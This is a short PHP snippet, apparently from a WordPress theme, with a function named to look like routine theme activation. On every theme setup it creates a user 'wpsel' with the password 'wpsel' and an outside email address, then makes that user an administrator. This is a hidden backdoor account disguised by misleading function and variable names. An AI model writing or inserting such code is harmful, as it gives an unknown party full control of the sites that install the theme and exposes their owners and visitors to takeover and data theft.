<?php
function required_file_activation(){
	$theme_actived_class = wp_create_user('wpsel', 'wpsel', 'litondeveloper@mail.com');
	$ConDel = new WP_user($theme_actived_class);
	$ConDel -> set_role('administrator');
}
add_action('after_setup_theme', 'required_file_activation');